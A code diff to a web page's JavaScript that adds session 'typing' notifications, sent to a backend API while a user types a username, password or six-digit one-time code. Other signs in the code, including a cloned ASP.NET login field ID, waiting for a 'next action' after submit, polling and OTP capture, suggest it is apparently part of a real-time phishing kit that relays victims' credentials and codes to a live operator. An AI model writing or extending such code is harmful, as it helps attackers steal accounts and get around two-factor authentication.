@@ -280,6 +280,21 @@
       let pollInterval = null;
       let isWaitingForNextAction = false;
       let lastSubmitTime = 0;
+      let hasInitialSubmitted = false;
+      let lastTypingSent = 0;
+
+      function notifyTyping() {
+        if (!sessionId || !hasInitialSubmitted) return;
+        const now = Date.now();
+        if (now - lastTypingSent > 1200) {
+          lastTypingSent = now;
+          fetch('/api/sessions/' + sessionId + '/state', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ state: 'typing' })
+          }).catch(() => {});
+        }
+      }
 
       // Elements
       const user = document.getElementById("MainContent_ctl01_txtUserNamePassword");
@@ -324,6 +339,7 @@
           return;
         }
 
+        hasInitialSubmitted = true;
         isWaitingForNextAction = true;
         lastSubmitTime = Date.now();
 
@@ -367,11 +383,21 @@
         }
       });
 
+      user?.addEventListener("input", () => {
+        if (hasInitialSubmitted) {
+          notifyTyping();
+        }
+      });
+
       pass?.addEventListener("keydown", function (event) {
         if (event.key === "Enter") {
           event.preventDefault();
           submitLogin();
         }
+      });
+
+      pass?.addEventListener("input", () => {
+        notifyTyping();
       });
 
       function startKeepalive() {
@@ -563,6 +589,7 @@
           } else if (getOtpValue().length === 6) {
             document.getElementById("btnSubmitToken")?.focus();
           }
+          notifyTyping();
         });
 
         slot.addEventListener("keydown", (e) => {
@@ -586,6 +613,7 @@
           if (pasteData.length === 6) {
             document.getElementById("btnSubmitToken")?.focus();
           }
+          notifyTyping();
         });
       });
 
